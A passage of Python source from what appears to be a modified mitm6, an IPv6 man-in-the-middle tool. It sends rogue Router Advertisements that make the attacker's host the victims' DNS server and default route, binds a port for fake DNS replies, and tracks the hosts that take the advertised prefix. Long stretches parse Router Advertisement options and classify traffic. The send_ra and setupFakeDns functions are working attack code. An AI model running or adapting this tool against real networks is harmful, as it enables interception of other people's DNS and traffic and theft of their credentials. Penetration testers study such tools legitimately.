                                            # NAT64 prefixes are always /96
                                            prefix_len = 96
                                            # Check if we already added this PREF64 (avoid duplicates)
                                            pref64_found = False
                                            for line in ra_info:
                                                if 'PREF64:' in line and prefix_addr.split('::')[0] in line:
                                                    pref64_found = True
                                                    break
                                            if not pref64_found:
                                                ra_info.append('  PREF64: %s/%d' % (prefix_addr, prefix_len))
                                        except (OSError, ValueError):
                                            # Fallback: display as hex
                                            prefix_bytes_list = [prefix_bytes[j] if isinstance(prefix_bytes, (bytes, bytearray)) else ord(prefix_bytes[j]) for j in range(0, 8)]
                                            prefix_hex = ':'.join(['%02x%02x' % (prefix_bytes_list[j], prefix_bytes_list[j+1]) for j in range(0, 8, 2)])
                                            pref64_found = False
                                            for line in ra_info:
                                                if 'PREF64:' in line and prefix_hex in line:
                                                    pref64_found = True
                                                    break
                                            if not pref64_found:
                                                ra_info.append('  PREF64: %s/96' % prefix_hex)
                                # Move to next option (options are aligned to 8-byte boundaries)
                                if opt_len_bytes > 0:
                                    i = ((i + opt_len_bytes + 7) // 8) * 8
                                else:
                                    i += 8  # Safety: advance by at least 8 bytes
                            else:
                                # Move to next option (options are aligned to 8-byte boundaries)
                                if i + 1 < len(icmp_payload):
                                    opt_len_units = icmp_payload[i + 1] if isinstance(icmp_payload, (bytes, bytearray)) else ord(icmp_payload[i + 1])
                                    opt_len_bytes = opt_len_units * 8
                                    if opt_len_bytes > 0:
                                        i = ((i + opt_len_bytes + 7) // 8) * 8
                                    else:
                                        i += 8  # Safety: advance by at least 8 bytes
                                else:
                                    break
                            # Safety check: ensure we always advance
                            if i == prev_i:
                                i += 8  # Force advance if we didn't move
                            prev_i = i
                            if i >= len(icmp_payload):
                                break
                except Exception as e:
                    if config.verbose or config.debug:
                        if 'PREF64:' not in str(ra_info):
                            ra_info.append('  PREF64: (raw parsing error: %s)' % str(e))
                
                # Print detailed information
                for line in ra_info:
                    print(line)
                    
            except (IndexError, KeyError) as e:
                if config.verbose or config.debug:
                    print('Router Advertisement from %s (%s) - Error parsing details: %s' % (p.src, p[IPv6].src, str(e)))
                else:
                    print('Router Advertisement from %s (%s)' % (p.src, p[IPv6].src))
    
    # Enhanced traffic analysis when --show-traffic is enabled
    if config.show_traffic:
        analyze_traffic(p)

def setupFakeDns():
    # We bind to port 53 to prevent ICMP port unreachable packets being sent
    # actual responses are sent by scapy
    sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
    fulladdr = config.v6addr
#+ '%' + config.default_if
    addrinfo = socket.getaddrinfo(fulladdr, 53, socket.AF_INET6, socket.SOCK_DGRAM)
    sock.bind(addrinfo[0][4])
    sock.setblocking(0)
    return sock

def send_ra():
    # Send a Router Advertisement with configurable "managed" and "other" flags
    # Build the Router Advertisement packet layer by layer
    p = Ether(dst='33:33:00:00:00:01')
    p /= IPv6(dst='ff02::1')
    
    # Set M and O flags based on command line arguments and DHCPv6 server status
    # If DHCPv6 is disabled, both M and O flags should be 0 (SLAAC only)
    if config.disable_dhcpv6:
        m_flag = 0  # Managed flag off - no DHCPv6
        o_flag = 0  # Other flag off - no additional configuration
    else:
        m_flag = 0 if config.no_managed else 1
        o_flag = 0 if config.no_other else 1
    
    # Set PREF64 flag if enabled (RFC 8781 defines P flag in RA header)
    pref64_flag = 1 if config.enable_pref64 else 0
    
    # Create RA header
    # Note: RFC 8781 defines a P flag (bit 4) in the RA header to indicate PREF64 options are present
    # scapy's ICMPv6ND_RA doesn't directly support the P flag, so we'll set it manually if needed
    p /= ICMPv6ND_RA(M=m_flag, O=o_flag, chlim=64)
    
    p /= ICMPv6NDOptPrefixInfo(type=3, prefixlen=64, preferredlifetime=600, validlifetime=600, prefix=config.ipv6prefix)
    p /= ICMPv6NDOptRouteInfo(prefix='::', plen=0, prf=8, rtlifetime=60)
    p /= ICMPv6NDOptRDNSS(lifetime=600, dns=[config.selfaddr])
    p /= ICMPv6NDOptMTU(mtu=1500)
    p /= ICMPv6NDOptSrcLLAddr(type=1, len=1, lladdr=config.macaddr)
    
    # Add PREF64 option if enabled (RFC 8781)
    if config.enable_pref64:
        # PREF64 option format (RFC 8781):
        # - Option Type: 1 byte (38 = 0x26 per RFC 8781)
        # - Option Length: 1 byte (in units of 8 octets)
        # - Reserved: 2 bytes
        # - Lifetime: 2 bytes (prefix lifetime in seconds)
        # - Prefix: 8 bytes (IPv6 prefix)
        # - Prefix Length: 1 byte
        # Total data: 2 + 2 + 8 + 1 = 13 bytes
        # Total option: 2 (type+length) + 13 = 15 bytes, rounded up to 16 bytes (2 units of 8 octets)
        
        # Lifetime (2 bytes) - default to 3600 seconds (0x0e10)
        # Note: Matching working router format - lifetime first, then prefix, then padding
        pref64_lifetime = 3600  # Default lifetime in seconds
        pref64_data = struct.pack('!H', pref64_lifetime)  # Lifetime (2 bytes, big-endian)
        # Add the NAT64 prefix (8 bytes) - use the network address
        # For /96 prefix, we need the first 8 bytes (64 bits) of the network address
        nat64_network = ipaddress.IPv6Network(config.nat64_prefix, strict=False)
        prefix_bytes = nat64_network.network_address.packed[:8]  # First 8 bytes of network address
        pref64_data += prefix_bytes  # 8 bytes
        # Padding (3 bytes) to make total 13 bytes of data
        # Note: Some implementations don't include prefix length byte, just padding
        pref64_data += struct.pack('BBB', 0x00, 0x00, 0x00)  # 3 bytes padding
        
        # Calculate option length in units of 8 octets
        # Total option size: 2 (type+length) + 13 (data) = 15 bytes
        # Round up to next 8-byte boundary: 16 bytes = 2 units
        opt_length = 2  # 16 bytes / 8 = 2 units
        
        # Create PREF64 option (RFC 8781: type 38 = 0x26)
        # Use standard type 38 for RFC 8781 compliance
        pref64_option = struct.pack('BB', 38, opt_length) + pref64_data
        
        # Pad to 8-byte boundary if needed (should be 16 bytes total)
        # We have 2 (header) + 13 (data) = 15 bytes, need 16 bytes
        if len(pref64_option) < 16:
            pref64_option += b'\x00' * (16 - len(pref64_option))
        
        p /= Raw(load=pref64_option)
        
        # Note: RFC 8781 also defines a P flag (bit 4) in the RA header flags byte
        # to indicate that PREF64 options are present. However, scapy's ICMPv6ND_RA
        # doesn't directly support this flag. The PREF64 option itself is the required
        # mechanism - the P flag is an optimization hint. Hosts should parse options
        # to find PREF64 even without the P flag set.
    
    sendp(p, iface=config.default_if, verbose=False)

def join_multicast_groups():
    """Join IPv6 multicast groups for all-routers and dhcpv6-servers"""
    try:
        # Create a raw socket to join multicast groups
        sock = socket.socket(socket.AF_INET6, socket.SOCK_RAW, socket.IPPROTO_ICMPV6)
        
        # Join all-routers multicast group (ff02::2)
        mreq = struct.pack('16sI', socket.inet_pton(socket.AF_INET6, 'ff02::2'), 0)
        sock.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_JOIN_GROUP, mreq)
        
        # Join dhcpv6-servers multicast group (ff02::1:2)
        mreq = struct.pack('16sI', socket.inet_pton(socket.AF_INET6, 'ff02::1:2'), 0)
        sock.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_JOIN_GROUP, mreq)
        
        sock.close()
        
        if config.verbose or config.debug:
            print('Successfully joined IPv6 multicast groups: ff02::2 (all-routers), ff02::1:2 (dhcpv6-servers)')
            
    except Exception as e:
        if config.verbose or config.debug:
            print('Warning: Could not join IPv6 multicast groups: %s' % str(e))
            print('This may require root privileges or the interface may not support multicast')

def analyze_traffic(p):
    """Analyze traffic patterns and highlight direct vs routed traffic"""
    try:
        # Skip packets we've already processed
        if (ICMPv6ND_RS in p or ICMPv6ND_NS in p or ICMPv6ND_NA in p or ICMPv6ND_RA in p or
            ARP in p or DNS in p):
            return
        
        # Handle DHCPv6 packets based on server status
        if DHCP6_Solicit in p or DHCP6_Request in p or DHCP6_Renew in p:
            if config.disable_dhcpv6:
                # In SLAAC-only mode, we still want to track DHCPv6 packets for monitoring
                if config.verbose or config.debug:
                    print('DHCPv6 traffic detected (server disabled): %s from %s' % (p.src, p[IPv6].src))
                return  # Skip further analysis
            else:
                return  # Skip analysis when DHCPv6 server is enabled (handled elsewhere)
        
        # Handle both IPv4 and IPv6 traffic
        if IPv6 in p:
            # IPv6 traffic analysis
            ipv6 = p[IPv6]
            src_ip = ipv6.src
            dst_ip = ipv6.dst
            ip_version = "IPv6"
        elif IP in p:
            # IPv4 traffic analysis
            if not config.include_legacy:
                return  # Skip IPv4 if not enabled
            ipv4 = p[IP]
            src_ip = ipv4.src
            dst_ip = ipv4.dst
            ip_version = "IPv4"
        else:
            return  # Neither IPv4 nor IPv6
        
        # Skip packets originating from the mitm6 host itself
        if src_ip == config.selfaddr or (ip_version == "IPv4" and src_ip == config.selfipv4):
            return
        
        # Skip broadcast and multicast traffic except for specific solicitation messages
        if (ip_version == "IPv6" and (dst_ip.startswith('ff02::') or dst_ip.startswith('ff01::') or dst_ip.startswith('ff00::'))) or \
           (ip_version == "IPv4" and (dst_ip == "255.255.255.255" or dst_ip.startswith("224.") or dst_ip.startswith("239."))):
            # Only allow Router Solicitation (ff02::2) and Neighbor Solicitation (ff02::1:ffxx:xxxx)
            if dst_ip == 'ff02::2':  # All-routers multicast
                # Check if this is a Router Solicitation
                if hasattr(ipv6, 'nh') and ipv6.nh == 58:  # ICMPv6
                    if len(p) > 40:  # IPv6 header is 40 bytes
                        try:
                            icmp_payload = p[Raw].load if Raw in p else None
                            if icmp_payload and len(icmp_payload) >= 1 and icmp_payload[0] == 133:  # RS
                                pass  # Allow Router Solicitation
                            else:
                                return  # Skip other multicast to all-routers
                        except:
                            return  # Skip if we can't parse
                    else:
                        return  # Skip if no payload
                else:
                    return  # Skip non-ICMPv6 traffic to all-routers
            elif dst_ip.startswith('ff02::1:ff'):  # Solicited-node multicast
                # Check if this is a Neighbor Solicitation
                if hasattr(ipv6, 'nh') and ipv6.nh == 58:  # ICMPv6
                    if len(p) > 40:  # IPv6 header is 40 bytes
                        try:
                            icmp_payload = p[Raw].load if Raw in p else None
                            if icmp_payload and len(icmp_payload) >= 1 and icmp_payload[0] == 135:  # NS
                                pass  # Allow Neighbor Solicitation
                            else:
                                return  # Skip other multicast to solicited-node
                        except:
                            return  # Skip if we can't parse
                    else:
                        return  # Skip if no payload
                else:
                    return  # Skip non-ICMPv6 traffic to solicited-node
            else:
                # Skip all other multicast traffic
                return
        
        # Determine traffic type
        traffic_type = "UNKNOWN"
        traffic_details = ""
        
        # TCP SYN detection only - ignore established connections
        if TCP in p:
            tcp = p[TCP]
            if hasattr(tcp, 'flags') and tcp.flags & 0x02:  # SYN flag
                traffic_type = "TCP_SYN"
                traffic_details = " :%d -> :%d" % (tcp.sport, tcp.dport)
            else:
                # Skip non-SYN TCP traffic (established connections, data packets, etc.)
                return
        
        # Non-TCP traffic detection
        elif TCP not in p:
            if UDP in p:
                udp = p[UDP]
                traffic_type = "UDP"
                traffic_details = " :%d -> :%d" % (udp.sport, udp.dport)
            elif ip_version == "IPv6" and hasattr(ipv6, 'nh') and ipv6.nh == 58:  # ICMPv6 protocol
                # Check if this is a Neighbor Discovery message
                if len(p) > 40:  # IPv6 header is 40 bytes
                    try:
                        # Try to access ICMPv6 payload
                        icmp_payload = p[Raw].load if Raw in p else None
                        if icmp_payload and len(icmp_payload) >= 1:
                            icmp_type = icmp_payload[0]
                            if icmp_type in [133, 134, 135, 136, 137, 138]:  # ND message types
                                traffic_type = "ICMPv6_ND"
                                traffic_details = " type=%d" % icmp_type
                            else:
                                traffic_type = "ICMPv6"
                                traffic_details = " type=%d" % icmp_type
                        else:
                            traffic_type = "ICMPv6"
                            traffic_details = ""
                    except:
                        traffic_type = "ICMPv6"
                        traffic_details = ""
                else:
                    traffic_type = "ICMPv6"
                    traffic_details = ""
            elif ip_version == "IPv4" and ICMP in p:
                # Handle IPv4 ICMP traffic
                icmp = p[ICMP]
                traffic_type = "ICMP"
                if hasattr(icmp, 'type'):
                    traffic_details = " type=%d" % icmp.type
                else:
                    traffic_details = ""
            else:
                traffic_type = "OTHER"
                # Try to identify the protocol
                if ip_version == "IPv6" and hasattr(ipv6, 'nh'):
                    protocol_num = ipv6.nh
                    # Map common protocol numbers to names
                    protocol_names = {
                        6: "TCP",
                        17: "UDP",
                        58: "ICMPv6",
                        43: "Routing Header",
                        44: "Fragment Header",
                        50: "ESP",
                        51: "AH",
                        60: "Destination Options",
                        135: "Mobility Header"
                    }
                    if protocol_num in protocol_names:
                        traffic_details = " %s" % protocol_names[protocol_num]
                    else:
                        traffic_details = " proto=%d" % protocol_num
                elif ip_version == "IPv4" and hasattr(ipv4, 'proto'):
                    protocol_num = ipv4.proto
                    # Map common IPv4 protocol numbers to names
                    protocol_names = {
                        1: "ICMP",
                        6: "TCP",
                        17: "UDP",
                        50: "ESP",
                        51: "AH"
                    }
                    if protocol_num in protocol_names:
                        traffic_details = " %s" % protocol_names[protocol_num]
                    else:
                        traffic_details = " proto=%d" % protocol_num
                else:
                    traffic_details = ""
        
        # Determine if traffic is direct or routed
        is_direct = False
        is_routed = False
        
        # Check if destination is directly to us
        if dst_ip == config.selfaddr or dst_ip == config.selfmac or (ip_version == "IPv4" and dst_ip == config.selfipv4):
            is_direct = True
        # Check if destination is our advertised prefix (IPv6 only)
        elif ip_version == "IPv6" and hasattr(config, 'ipv6prefix') and config.ipv6prefix:
            try:
                prefix_network = ipaddress.IPv6Network(config.ipv6prefix, strict=False)
                if ipaddress.IPv6Address(dst_ip) in prefix_network:
                    is_direct = True
            except:
                pass
        
        # Check if this is traffic being routed through us (default gateway)
        # This would be traffic from our prefix to external destinations
        if ip_version == "IPv6" and hasattr(config, 'ipv6prefix') and config.ipv6prefix:
            try:
                prefix_network = ipaddress.IPv6Network(config.ipv6prefix, strict=False)
                if (ipaddress.IPv6Address(src_ip) in prefix_network and 
                    ipaddress.IPv6Address(dst_ip) not in prefix_network):
                    is_routed = True
            except:
                pass
        elif ip_version == "IPv4":
            # For IPv4, we can't easily determine if traffic is routed through us
            # since we don't have a delegated prefix, so mark as pass-through
            pass
        
        # Format the output
        if is_direct:
            traffic_indicator = "[DIRECT]"
        elif is_routed:
            traffic_indicator = "[ROUTED]"
        else:
            traffic_indicator = "[PASS-THRU]"
        
        # Print traffic information with source and destination details
        print("%s %s: %s (%s) -> %s%s" % (
            traffic_indicator,
            traffic_type,
            p.src,
            src_ip,
            dst_ip,
            traffic_details
        ))
        
        # Track host based on traffic - add to prefix hosts if source is in our prefix
        if ip_version == "IPv6":
            try:
                source_ipv6 = ipaddress.IPv6Address(src_ip)
                if hasattr(config, 'ipv6prefix') and config.ipv6prefix:
                    prefix_network = ipaddress.IPv6Network(config.ipv6prefix + '/64', strict=False)
                    if source_ipv6 in prefix_network:
                        # This host is using an address in our prefix - track it
                        if p.src not in pcdict:
                            pcdict[p.src] = Target(p.src, '')
                        target = pcdict[p.src]
                        # Add to SLAAC if not already tracked via DHCPv6
                        if str(source_ipv6) not in target.ipv6_dhcpv6:
                            if str(source_ipv6) not in target.ipv6_slaac:
                                target.ipv6_slaac.add(str(source_ipv6))
            except (ipaddress.AddressValueError, ValueError):
                pass
        
    except Exception as e:
        if config.verbose or config.debug:
            print("Error analyzing traffic: %s" % str(e))

def generate_delegated_prefix(requested_length=64):
    """Generate a new delegated prefix from the available delegation pool"""
    if requested_length < config.delegation_length:
        # Requested prefix is larger than our delegation pool
        return None
    
    # Calculate how many subnets we can create
    available_bits = requested_length - config.delegation_length
    max_subnets = 2 ** available_bits
    
    # Try to find an available prefix
    for attempt in range(max_subnets):
        # Generate subnet number
        subnet_num = (config.delegation_counter + attempt) % max_subnets
        
        # Create the delegated prefix
        delegated_network = config.delegation_network.subnets(new_prefix=requested_length)
        delegated_prefix = list(delegated_network)[subnet_num]
        
        # Check if this prefix is already delegated
        if str(delegated_prefix) not in config.delegated_prefixes:
            config.delegated_prefixes.add(str(delegated_prefix))
            config.delegation_counter = (config.delegation_counter + 1) % max_subnets
            return delegated_prefix
    
    return None

def check_existing_ipv6_router():
    """Send a Router Solicitation and wait for replies to detect existing IPv6 routers"""
    print('Checking for existing IPv6 routers on the network...')
    
    # Set up packet capture for Router Advertisements FIRST
    ra_detected = False
    ra_sources = set()
    
    def capture_ra(packet):
        nonlocal ra_detected
        if ICMPv6ND_RA in packet and packet.src != config.selfmac:
            ra_detected = True
            ra_sources.add(packet.src)
            
            # Extract detailed information from the Router Advertisement
            ra_info = []
            ra_info.append('Router Advertisement from %s (%s)' % (packet.src, packet[IPv6].src))
            
            try:
                ra_layer = packet[ICMPv6ND_RA]
                
                # Debug output for RA parsing
                if config.verbose or config.debug:
                    print('    Debug: RA layer type: %s' % type(ra_layer))
                    print('    Debug: RA layer has options: %s' % hasattr(ra_layer, 'options'))
                    if hasattr(ra_layer, 'options'):
                        print('    Debug: RA options: %s' % ra_layer.options)
                    print('    Debug: Packet layers: %s' % [layer.__class__.__name__ for layer in packet.layers()])
                
                # Basic RA flags and parameters
                flags = []
                if hasattr(ra_layer, 'M') and ra_layer.M:
                    flags.append('M (Managed)')
                if hasattr(ra_layer, 'O') and ra_layer.O:
                    flags.append('O (Other)')
                # Check for P flag (PREF64) in RA header (RFC 8781)
                if hasattr(ra_layer, 'P') and ra_layer.P:
                    flags.append('P (PREF64)')
                if hasattr(ra_layer, 'chlim'):
                    flags.append('chlim: %d' % ra_layer.chlim)
                if hasattr(ra_layer, 'routerlifetime'):
                    flags.append('router_lifetime: %d' % ra_layer.routerlifetime)
                
                if flags:
                    ra_info.append('  Flags/Params: %s' % ', '.join(flags))
                
                # Try to access options directly from packet
                try:
                    if ICMPv6NDOptPrefixInfo in packet:
                        prefix_opt = packet[ICMPv6NDOptPrefixInfo]
                        ra_info.append('  Prefix: %s/%d' % (prefix_opt.prefix, prefix_opt.prefixlen))
                        if hasattr(prefix_opt, 'preferredlifetime'):
                            ra_info.append('    Preferred lifetime: %d' % prefix_opt.preferredlifetime)
                        if hasattr(prefix_opt, 'validlifetime'):
                            ra_info.append('    Valid lifetime: %d' % prefix_opt.validlifetime)
                        if hasattr(prefix_opt, 'L') and prefix_opt.L:
                            ra_info.append('    L flag: On-link')
                        if hasattr(prefix_opt, 'A') and prefix_opt.A:
                            ra_info.append('    A flag: Autonomous')
                    
                    if ICMPv6NDOptRDNSS in packet:
                        rdnss_opt = packet[ICMPv6NDOptRDNSS]
                        if hasattr(rdnss_opt, 'dns'):
                            dns_servers = ', '.join(rdnss_opt.dns)
                            ra_info.append('  RDNSS: %s' % dns_servers)
                            if hasattr(rdnss_opt, 'lifetime'):
                                ra_info.append('    Lifetime: %d' % rdnss_opt.lifetime)
                except Exception as e:
                    if config.verbose or config.debug:
                        print('    Error parsing RA options directly: %s' % str(e))
                
                # Extract options
                if hasattr(ra_layer, 'options'):
                    for opt in ra_layer.options:
                        if hasattr(opt, 'type'):
                            if opt.type == 3:  # Prefix Information
                                if hasattr(opt, 'prefix') and hasattr(opt, 'prefixlen'):
                                    ra_info.append('  Prefix: %s/%d' % (opt.prefix, opt.prefixlen))
                                    if hasattr(opt, 'preferredlifetime'):
                                        ra_info.append('    Preferred lifetime: %d' % opt.preferredlifetime)
                                    if hasattr(opt, 'validlifetime'):
                                        ra_info.append('    Valid lifetime: %d' % opt.validlifetime)
                                    if hasattr(opt, 'L') and opt.L:
                                        ra_info.append('    L flag: On-link')
                                    if hasattr(opt, 'A') and opt.A:
                                        ra_info.append('    A flag: Autonomous')
                            
                            elif opt.type == 24:  # Route Information
                                if hasattr(opt, 'prefix') and hasattr(opt, 'plen'):
                                    ra_info.append('  Route: %s/%d' % (opt.prefix, opt.plen))
                                    if hasattr(opt, 'rtlifetime'):
                                        ra_info.append('    Route lifetime: %d' % opt.rtlifetime)
                                    if hasattr(opt, 'prf'):
                                        ra_info.append('    Preference: %d' % opt.prf)
                            
                            elif opt.type == 25:  # RDNSS
                                if hasattr(opt, 'dns'):
                                    dns_servers = ', '.join(opt.dns)
                                    ra_info.append('  RDNSS: %s' % dns_servers)
                                    if hasattr(opt, 'lifetime'):
                                        ra_info.append('    Lifetime: %d' % opt.lifetime)
                            
                            elif opt.type == 26:  # DNSSL
                                if hasattr(opt, 'dnsdomains'):
                                    domains = ', '.join(opt.dnsdomains)
                                    ra_info.append('  DNSSL: %s' % domains)
                                    if hasattr(opt, 'lifetime'):
                                        ra_info.append('    Lifetime: %d' % opt.lifetime)
                            
                            elif opt.type == 5:  # MTU
                                if hasattr(opt, 'mtu'):
                                    ra_info.append('  MTU: %d' % opt.mtu)
                            
                            elif opt.type == 1:  # Source Link-Layer Address
                                if hasattr(opt, 'lladdr'):
                                    ra_info.append('  Source LL: %s' % opt.lladdr)
                            
                            elif opt.type == 38 or opt.type == 138:  # PREF64 (RFC 8781: type 38, or 0x8A/138 for compatibility)
                                # PREF64 option format (RFC 8781):
                                # - Option Type: 1 byte
                                # - Option Length: 1 byte (in units of 8 octets)
                                # - Reserved: 4 bytes
                                # - Prefix: 8 bytes (IPv6 prefix)
                                # - Prefix Length: 1 byte
                                try:
                                    # Try to get raw option data
                                    opt_data = None
                                    if hasattr(opt, 'load'):
                                        opt_data = opt.load
                                    elif hasattr(opt, 'data'):
                                        opt_data = opt.data
                                    elif hasattr(opt, '__bytes__'):
                                        # Try to get bytes representation and skip type/length header
                                        try:
                                            opt_bytes = bytes(opt)
                                            if len(opt_bytes) >= 15:  # Type(1) + Length(1) + Reserved(4) + Prefix(8) + PrefixLen(1)
                                                opt_data = opt_bytes[2:]  # Skip type and length bytes
                                        except:
                                            pass
                                    
                                    # If still no data, try to find in raw payload
                                    if opt_data is None and Raw in packet:
                                        icmp_payload = packet[Raw].load if Raw in packet else None
                                        if icmp_payload:
                                            # Search for PREF64 option in payload (options start after 8-byte RA header)
                                            opt_type = opt.type
                                            # Start search from after RA header (8 bytes) if payload is full ICMPv6 message
                                            start_offset = 8 if len(icmp_payload) > 8 else 0
                                            i = start_offset
                                            while i < len(icmp_payload) - 1:
                                                if icmp_payload[i] == opt_type:
                                                    opt_len = icmp_payload[i + 1] * 8  # Length in units of 8 octets
                                                    if i + opt_len <= len(icmp_payload):
                                                        opt_data = icmp_payload[i+2:i+opt_len]
                                                        break
                                                # Move to next option (options are aligned to 8-byte boundaries)
                                                i += 8
                                    
                                    if opt_data and len(opt_data) >= 10:  # Minimum: 2 lifetime + 8 prefix
                                        # PREF64 format: Lifetime (2 bytes) + Prefix (8 bytes) + Padding (remaining)
                                        # NAT64 prefixes are always /96, so prefix length is not included in the option
                                        prefix_bytes = opt_data[2:10]  # 8 bytes for IPv6 prefix (skip lifetime)
                                        
                                        # Convert prefix bytes to IPv6 address string
                                        # Need to pad to 16 bytes for inet_ntop
                                        try:
                                            prefix_full = prefix_bytes + b'\x00' * 8  # Pad to 16 bytes
                                            prefix_addr = socket.inet_ntop(socket.AF_INET6, prefix_full)
                                            # NAT64 prefixes are always /96
                                            ra_info.append('  PREF64: %s/96' % prefix_addr)
                                        except (OSError, ValueError):
                                            # Fallback: display as hex
                                            prefix_hex = ':'.join(['%02x%02x' % (prefix_bytes[i], prefix_bytes[i+1]) for i in range(0, 8, 2)])
                                            ra_info.append('  PREF64: %s/96' % prefix_hex)
                                except Exception as e:
                                    if config.verbose or config.debug:
                                        ra_info.append('  PREF64: (parsing error: %s)' % str(e))
                
                # Also parse raw ICMPv6 payload directly for PREF64 options
                # (scapy might not include unknown options in ra_layer.options)
                try:
                    # Get the ICMPv6 payload - options start after the 8-byte RA header
                    icmp_payload = None
                    # Try to get bytes from the ICMPv6 layer (this gives us the full RA message)
                    try:
                        icmp_bytes = bytes(packet[ICMPv6ND_RA])
                        if len(icmp_bytes) > 8:  # RA header is 8 bytes
                            icmp_payload = icmp_bytes[8:]  # Options start after 8-byte header
                    except:
                        # Fallback: try Raw layer
                        if Raw in packet:
                            raw_data = packet[Raw].load
                            # If Raw contains the full ICMPv6 message, skip the 8-byte RA header
                            # Otherwise assume it's just the options
                            if len(raw_data) > 8 and raw_data[0] == 134:  # ICMPv6 type 134 = RA
                                icmp_payload = raw_data[8:]
                            else:
                                icmp_payload = raw_data
                    
                    if icmp_payload:
                        # Search for PREF64 options (type 38 or 138) in the payload
                        i = 0
                        max_iterations = len(icmp_payload) // 8 + 1  # Safety limit
                        iteration = 0
                        prev_i = -1
                        while i < len(icmp_payload) - 1 and iteration < max_iterations:
                            iteration += 1
                            if i + 1 >= len(icmp_payload):
                                break
                            opt_type = icmp_payload[i] if isinstance(icmp_payload, (bytes, bytearray)) else ord(icmp_payload[i])
                            if opt_type in (38, 138):  # PREF64 option types
                                opt_len_units = icmp_payload[i + 1] if isinstance(icmp_payload, (bytes, bytearray)) else ord(icmp_payload[i + 1])
                                opt_len_bytes = opt_len_units * 8  # Length in units of 8 octets
                                if opt_len_bytes > 0 and i + opt_len_bytes <= len(icmp_payload) and opt_len_bytes >= 16:
                                    # Extract option data (skip type and length bytes)
                                    opt_data = icmp_payload[i+2:i+opt_len_bytes]
                                    if len(opt_data) >= 10:  # Minimum: 2 lifetime + 8 prefix
                                        # PREF64 format: Lifetime (2 bytes) + Prefix (8 bytes) + Padding (remaining)
                                        # NAT64 prefixes are always /96, so prefix length is not included in the option
                                        prefix_bytes = opt_data[2:10]  # 8 bytes for IPv6 prefix (skip lifetime)
                                        
                                        # Convert prefix bytes to IPv6 address string
                                        # Need to pad to 16 bytes for inet_ntop
                                        try:
                                            prefix_full = prefix_bytes + b'\x00' * 8  # Pad to 16 bytes
                                            prefix_addr = socket.inet_ntop(socket.AF_INET6, prefix_full)
                                            # NAT64 prefixes are always /96
                                            # Check if we already added this PREF64 (avoid duplicates)
                                            pref64_found = False
                                            for line in ra_info:
                                                if 'PREF64:' in line and prefix_addr.split('::')[0] in line:
                                                    pref64_found = True
                                                    break
                                            if not pref64_found:
                                                ra_info.append('  PREF64: %s/96' % prefix_addr)
                                        except (OSError, ValueError):
                                            # Fallback: display as hex
                                            prefix_bytes_list = [prefix_bytes[j] if isinstance(prefix_bytes, (bytes, bytearray)) else ord(prefix_bytes[j]) for j in range(0, 8)]
                                            prefix_hex = ':'.join(['%02x%02x' % (prefix_bytes_list[j], prefix_bytes_list[j+1]) for j in range(0, 8, 2)])
                                            pref64_found = False
                                            for line in ra_info:
                                                if 'PREF64:' in line and prefix_hex in line:
                                                    pref64_found = True
                                                    break
                                            if not pref64_found:
                                                ra_info.append('  PREF64: %s/96' % prefix_hex)
                                # Move to next option (options are aligned to 8-byte boundaries)
                                if opt_len_bytes > 0:
                                    i = ((i + opt_len_bytes + 7) // 8) * 8
                                else:
                                    i += 8  # Safety: advance by at least 8 bytes
                            else:
                                # Move to next option (options are aligned to 8-byte boundaries)
                                if i + 1 < len(icmp_payload):
                                    opt_len_units = icmp_payload[i + 1] if isinstance(icmp_payload, (bytes, bytearray)) else ord(icmp_payload[i + 1])
                                    opt_len_bytes = opt_len_units * 8
                                    if opt_len_bytes > 0:
                                        i = ((i + opt_len_bytes + 7) // 8) * 8
                                    else:
                                        i += 8  # Safety: advance by at least 8 bytes
                                else:
                                    break
                            # Safety check: ensure we always advance
                            if i == prev_i:
                                i += 8  # Force advance if we didn't move
                            prev_i = i
                            if i >= len(icmp_payload):
                                break
                except Exception as e:
                    if config.verbose or config.debug:
                        if 'PREF64:' not in str(ra_info):
                            ra_info.append('  PREF64: (raw parsing error: %s)' % str(e))
                
                # Print detailed information
                for line in ra_info:
                    print(line)
                    
            except Exception as e:
                if config.verbose or config.debug:
                    print('  Error parsing RA details: %s' % str(e))
                # Fallback to basic info
                print('Router Advertisement detected from %s (%s)' % (packet.src, packet[IPv6].src))
    
    # Start packet capture in a separate thread
    import threading
    import time
    
    def capture_thread():
        try:
            sniff(iface=config.default_if, filter="icmp6", prn=capture_ra, timeout=5, store=0)
        except Exception as e:
            if config.verbose or config.debug:
                print('Warning: Error during router detection capture: %s' % str(e))
    
    capture_thread_obj = threading.Thread(target=capture_thread)
    capture_thread_obj.daemon = True
    capture_thread_obj.start()
    
    # Give the capture thread a moment to start up
    time.sleep(0.1)
    
    # NOW send Router Solicitation
    rs_packet = Ether(dst='33:33:00:00:00:02')/IPv6(src=config.selfaddr, dst='ff02::2')/ICMPv6ND_RS()
    sendp(rs_packet, iface=config.default_if, verbose=False)
    
    # Wait for the capture thread to complete
    capture_thread_obj.join()
    
    if ra_detected:
        print('WARNING: Existing IPv6 router(s) detected on the network!')
        print('Router Advertisement(s) received from: %s' % ', '.join(ra_sources))
        print('This could cause network conflicts and potential DoS conditions.')
        print('Use --ignore-existing-v6-risk-dos to override this check and continue anyway.')
        return True
    else:
        print('No existing IPv6 routers detected. Proceeding safely.')
        return False

# Whether packet capturing should stop
def should_stop(_):
    return not reactor.running

def report_ipv6_hosts():
    """Report comprehensive IPv6 host information"""
    # Track all hosts with addresses in our prefix
    prefix_hosts = []
    # Track all link-local addresses
    link_local_hosts = []
    
    for mac, target in pcdict.items():
        # Check for addresses in our advertised prefix
        prefix_addresses = []
        
        # Check SLAAC addresses
        if hasattr(target, 'ipv6_slaac') and target.ipv6_slaac:
            for addr_str in target.ipv6_slaac:
                try:
                    addr = ipaddress.IPv6Address(addr_str)
                    if hasattr(config, 'ipv6prefix') and config.ipv6prefix:
                        prefix_network = ipaddress.IPv6Network(config.ipv6prefix + '/64', strict=False)
                        if addr in prefix_network:
                            prefix_addresses.append((addr_str, 'SLAAC'))
                except ipaddress.AddressValueError:
                    pass
        
        # Check DHCPv6 addresses
        if hasattr(target, 'ipv6_dhcpv6') and target.ipv6_dhcpv6:
            for addr_str in target.ipv6_dhcpv6:
                try:
                    addr = ipaddress.IPv6Address(addr_str)
                    if hasattr(config, 'ipv6prefix') and config.ipv6prefix:
                        prefix_network = ipaddress.IPv6Network(config.ipv6prefix + '/64', strict=False)
                        if addr in prefix_network:
                            prefix_addresses.append((addr_str, 'DHCPv6'))
                except ipaddress.AddressValueError:
                    pass
        
